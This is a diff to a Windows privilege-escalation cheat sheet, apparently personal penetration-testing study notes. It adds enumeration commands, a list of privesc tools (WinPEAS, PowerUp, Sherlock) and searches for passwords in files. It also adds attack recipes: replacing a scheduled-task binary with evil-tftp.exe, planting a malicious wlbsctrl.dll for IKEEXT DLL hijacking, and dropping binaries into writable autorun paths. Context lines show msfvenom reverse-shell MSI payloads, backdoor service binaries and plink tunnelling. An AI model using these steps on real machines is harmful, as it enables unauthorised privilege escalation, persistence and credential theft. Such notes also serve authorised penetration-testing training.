@@ -4,13 +4,16 @@
 ### Check OS, Patch level, Basic 
 ````
 systeminfo  
-wmic qfe get Caption,Description,HotFixID,InstalledOn  
+Systeminfo | findstr /B /C:"OS Name" /C:"System Type"  etc .. 
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+Wmic logicaldisk get caption,description 
 
 whoami  
 echo %USERNAME%  
 
-Whoami /priv
+whoami /priv
 whoami /groups 
+whoami /all
 
 net user  
 net localgroup  
@@ -18,10 +21,12 @@ net user /domain
 net group /domain  
 net group /domain <Group Name>  
 ````
-### Firewall  
+### Firewall / AV / Defender 
 ````
 netsh firewall show state  
 netsh firewall show config  
+Sc query windefend
+Netsh advfirewall firewall dump, netsh firewall show state 
 ````
 
 ### Network  
@@ -48,16 +53,61 @@ File Perms
 \\192.168.119.155\test\accesschk.exe /accepteula -uwqs  "Authenticated Users" C:\*.*
 \\192.168.119.155\test\accesschk.exe /accepteula -uwdqs "Everyone" C:\*.*
 
+Run JAWS
+
+# Executables  
+WinPEAS.exe /.bat * 
+Seatbelt.exe 
+Watson.exe * 
+Sharpup.exe 
+
+#Powershell 
+Sherlock.ps1 * 
+PowerUp.ps1 * 
+jaws-enumps1 * 
+
+#Other 
+Windows-exploit-suggester.py *
+Systeminfo -> a text file and run it with windows exploit suggester.py, search for exploit in SecWiki github 
+
+MSF exploit suggester *
+In a meterpreter session – run /post/multi/recon/local_exploit_suggester - > shows list of kernel
 
 ````
+
+### Installed applications and services 
+````
+#running processes to started services 
+tasklist /SVC
+#Windows services thatare started
+net start
+#Look for 3rd party drivers 
+DRIVERQUERY
+
+#Check if WMIC is allowd on low pirv shell. Mostly allowed on Win7 /win8 
+ wmic /?
+Automated WMIC info - https://www.fuzzysecurity.com/tutorials/files/wmic_info.rar 
+wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."
+
+#Check directory permissions 
+cacls "C:\Python27"
+
+````
+
 ### Scheduled Tasks  
 ````
-schtasks /query /fo LIST /v  # Copy to schtasks.txt on local and run -> cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM  
+schtasks /query /fo LIST /v  # Copy to schtasks.txt on local and run 
+-> cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM  
 
 dir %SystemRoot%\Tasks  
 
 e.g. c:\windows\tasks\  
 e.g. c:\windows\system32\tasks\  
+
+# If we have write permissions on the  scheduleded taks binary / binary dir 
+accesschk.exe -dqv "E:\GrabLogs"
+copy evil-tftp.exe E:\GrabLogs\tftp.exe
+
 ````
 
 ### Startups and autoruns 
@@ -71,7 +121,7 @@ reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
 dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
 dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 
-Check access on the file using accesschk 
+Check access on the files and dir using accesschk , if writebale , we can write malicuis binary 
 accesschk64.exe /accepteula -wvu "C:\Program Files\Autorun Program"
 ````
 
@@ -123,6 +173,7 @@ upload plink.exe
 plink.exe -R "remote port":127.0.0.1:"local port"  root@"ipaddress"
 ````
 ### Pasword in files  
+Check for savecred
 ````
 https://pentestlab.blog/tag/privilege-escalation/page/3/  
 cmdkey /list        << If there are entries, it means that we may able to runas certain user who stored his cred in windows  
@@ -140,6 +191,7 @@ Can we find any SAM files?
 findstr /si password *.txt  
 findstr /si password *.xml  
 findstr /si password *.ini  
+Findstr /si password *.config 
 findstr /si pass/pwd *.ini  
 
 dir /s *pass* == *cred* == *vnc* == *.config*  
@@ -230,17 +282,11 @@ icacls "C:\Program Files\Heisenburg"  # or  .\accesschk.exe /accepteula -uwdq "C
 # Example output for accesschk.exe:
 #  RW BUILTIN\Users
 
-
 # Create reverse shell binary and copy it accordingly
-
 copy %temp%\backdoor.exe "C:\Program Files\Heisenburg\The.exe" 
 
 # now reboot to have the service auto start 
-
 shutdown /r /t 0
-
-
-
 
 ## Case 2, SeShutdownPrivilege = Disabled, we have (service_stop,service_start) privilege on a service
 
@@ -387,6 +433,26 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<MY-IP> LPORT=<MY-PORT> -f msi -
 msiexec /quiet /qn /i C:\Temp\shell.msi
 ```
 
+#### DLL hijacking 
+````
+You can see the DLL search order on 32-bit systems below:
+1 - The directory from which the application loaded
+2 - 32-bit System directory (C:\Windows\System32)
+3 - 16-bit System directory (C:\Windows\System)
+4 - Windows directory (C:\Windows)
+5 - The current working directory (CWD)
+6 - Directories in the PATH environment variable (system then user)
+As a low privilege user we have little hope of putting a malicious DLL in 1-4, 5 is not a possibility in this case because we are talking about a Windows service but if we have write access to any of the directories in the Windows PATH we win.
+echo %path%
+# We can check our access permissions with accesschk or cacls
+accesschk.exe -dqv "C:\Python27"
+cacls "C:\Python27"
+# Before we go over to action we need to check the status of the IKEEXT service. In this case we can see it is set to "AUTO_START" so it will launch on boot!
+sc qc IKEEXT
+copy evil.dll C:\Python27\wlbsctrl.dll
+Restart
+
+````
 
 #### Stored credentials
 
@@ -420,12 +486,6 @@ reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
 
-## Search for password in common files 
-```sh
-dir /s *pass* == *cred* == *vnc* == *.config*
-findstr /si password *.xml *.ini *.txt
-```
-
 
 #### Files that may contain passwords 
 ```sh
@@ -455,3 +515,11 @@ accesschk.exe -uwdqs "Authenticated Users" c:\
 accesschk.exe -uwqs Users c:\*.*
 accesschk.exe -uwqs "Authenticated Users" c:\*.*
 ```
+
+### LINK 
+https://www.fuzzysecurity.com/tutorials/16.html
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
+https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+
+
